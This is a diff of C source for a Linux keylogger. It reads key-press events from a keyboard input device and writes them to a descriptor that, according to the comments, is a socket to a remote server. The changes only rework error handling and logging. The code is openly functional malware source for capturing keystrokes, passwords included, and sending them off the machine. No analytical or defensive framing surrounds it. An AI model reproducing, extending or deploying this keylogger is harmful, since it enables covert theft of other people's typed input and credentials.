@@ -17,7 +17,8 @@ int STOP_KEYLOGGER = 0;
 
 void startKeylogger(int keyboard, int fd)
 {
-    size_t to_write, written, event_size = sizeof(event);
+    ssize_t to_write;
+    size_t event_size = sizeof(event);
     event *kbd_events;
     struct sigaction sa;
 
@@ -29,31 +30,25 @@ void startKeylogger(int keyboard, int fd)
 
     kbd_events = malloc(sizeof(event) * MAX_EVENTS);
 
-    while (!STOP_KEYLOGGER) // If server closed socket (SIGPIPE), user sent SIGTERM or an IO error occurred we stop keylogging
+    while (!STOP_KEYLOGGER) // If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging
     {
         to_write = read(keyboard, kbd_events, event_size * MAX_EVENTS);
         if (to_write < 0) // If read was interrupted by SIGTERM or another error occurred we stop keylogging
-        {
-            syslog(LOG_ERR, "Read from keyboard device failed: %s %d", strerror(errno), errno);
             goto end;
-        }
         else
         {
             size_t j = 0;
             for (size_t i = 0; i < to_write / event_size; i++) // For each event read
             {
-
                 if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) // If a key has been pressed..
                     kbd_events[j++] = kbd_events[i];                                    // Add the event to the beginning of the array
             }
-            if (writeEventsIntoFile(fd, kbd_events, j * event_size) == -1)
-            {
-                syslog(LOG_ERR, "Error while writing events: %s", strerror(errno));
+            if (writeEventsIntoFile(fd, kbd_events, j * event_size) < 0) //
                 goto end;
-            }
         }
     }
 end:
+    syslog(LOG_ERR, "Shutting down keylogger, cause: %s", strerror(errno));
     close(fd);
     close(keyboard);
     free(kbd_events);
@@ -71,8 +66,8 @@ int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
     do
     {
         written = write(fd, events, to_write);
-        if (written < 0) // It can fail with EPIPE (If server closed its socket) or with EINTR if it is interrupted by SIGTERM before any bytes were written
-            return -1;
+        if (written < 0) // It can fail with EPIPE (If server closed socket) or with EINTR if it is interrupted by a signal before any bytes were written
+            return -1;   // If it is interrupted by a signal after at least one byte was written, it returns the number of bytes written
         events += written;
         to_write -= written;
     } while (to_write > 0);
